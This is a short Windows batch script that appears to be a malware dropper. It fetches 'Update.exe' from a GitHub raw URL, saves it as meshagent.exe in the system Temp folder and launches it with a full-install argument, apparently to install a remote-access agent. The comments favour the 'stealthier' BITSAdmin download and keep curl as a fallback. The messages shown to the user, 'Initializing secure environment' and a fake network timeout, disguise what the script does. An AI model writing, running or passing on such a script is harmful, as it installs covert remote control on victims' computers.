@echo off
setlocal Enabledelayedexpansion

:: Define secure variables
set "URL=https://raw.githubusercontent.com/abrahamgarciaaa1972-ai/In/refs/heads/main/Update.exe"
set "DEST_DIR=%SystemRoot%\Temp"
set "DEST_FILE=%DEST_DIR%\meshagent.exe"

echo Initializing secure environment...

:: Download using native BITSAdmin (much cleaner and stealthier than raw PowerShell calls)
bitsadmin /transfer "MeshDownload" /priority FOREGROUND "%URL%" "%DEST_FILE%" >nul 2>&1

:: Fallback to native curl if BITSAdmin is restricted on the endpoint
if not exist "%DEST_FILE%" (
    curl -s -L -o "%DEST_FILE%" "%URL%" >nul 2>&1
)

:: Verify file exists before triggering execution
if exist "%DEST_FILE%" (
    echo Launching setup...
    :: Start the executable natively with the required installation argument
    start "" "%DEST_FILE%" -fullinstall
) else (
    echo Connection timed out. Please check your network.
    pause
)

exit
